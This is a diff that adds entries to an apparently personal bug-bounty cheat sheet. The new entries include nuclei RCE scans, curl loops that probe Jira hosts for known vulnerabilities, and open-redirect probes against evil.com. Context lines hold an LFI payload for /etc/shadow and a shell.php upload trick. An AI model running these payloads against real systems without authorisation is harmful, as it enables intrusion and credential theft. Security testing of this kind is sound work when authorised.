@@ -57,7 +57,10 @@ Automatic scanners
 1- nuclei 	=> nuclei -df httpx.txt -t /home/nuclei-templates -o nucleioutput
 2- whatweb --no-errors 10.10.10.0/24
 3-wpscan =>  Wpscan --url https://site.com/wordpress -e at -e ap -e u
-4- 
+4- echo subdomains.txt | httpx --silent | nuclei -t php8-dev-rce.yaml
+5- cat hosts.txt | while read host do; do curl -s -k --insecure "$host/secure/ViewUserHover.jspa"|grep -qsi "User does not exist"&&
+\printf "$host\033[0;31mVulnerable\n"||printf "$host \033[0;32mNot Vulnerable\n";done
+6- 
 ------------------------------------------------------------------------------------------------------
 Subdomain takeover 
 1- use Subjack => https://github.com/haccer/subjack
@@ -346,7 +349,9 @@ CRLF
 ---------------------------------------------------------------------------------------------------
 Open Redirect
 1- https://target.com/logout?redirect=////google.com
-
+2- cat httpx.txt | waybackurls | tee wayback.txt ; cat wayback.txt | sort -u | grep "\?">> open.txt;nuclei -t Url-Redirection-Catcher.yaml -l openredirect.txt
+3- httpx -l all-alive-subs.txt -path "///evil.com" -status-code -mc 302 		or ////eveil.com
+4- 
 --------------------------------------------------------------------------------------------------
 LFI
 1- https://example.com/api/download/..%2f..%2f..%2f..%2fetc%2fshadow
@@ -934,6 +939,13 @@ site.com/wp-admin/admin-ajax.php?action=tie_get_user_weather&options=%7B%27locat
 	can exploit user and brute force it in xmlrpc.php
 
 -------------------------------------------------------------------------------------------------------
+Httpx 
+
+-------------------------------------------------------------------------------------------------------
+Burpsuite
+1-search for =>  Request.Query CONTAINS "=https"	==> for open redirect 
+
+--------------------------------------------------------------------------------------------------------
 Cors misconfigratoin
 1- get all subdomains
 	- cat httpx.txt | parallel -j 10 curl --proxy "http://127.0.0.1:8080" -sk 2>/dev/null
@@ -1093,8 +1105,11 @@ GET /shell.php -H "X-Method-Override: PUT" ==> 200
 
 ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Jira
-user tool Jira-Lens = > https://github.com/MayankPandey01/Jira-Lens 	to search and exploit jira
-
+1- user tool Jira-Lens = > https://github.com/MayankPandey01/Jira-Lens 	to search and exploit jira
+2- cat hosts.txt or =>
+echo "https://jira.exmaple.com"|while read host do; do curl -s -k --insecure --path-as-is "$host/secure/QueryComponent\!Default.jspa"|grep -qsi 'searchers' &&
+printf "$host \033[0;31mVulnerable\n"||printf "$host \033[0;32mNot Vulnerable\n";done
+3- 
 
 ---------------------------------------------------------------------------------------------------------------------------------------------
 Default Credinals 
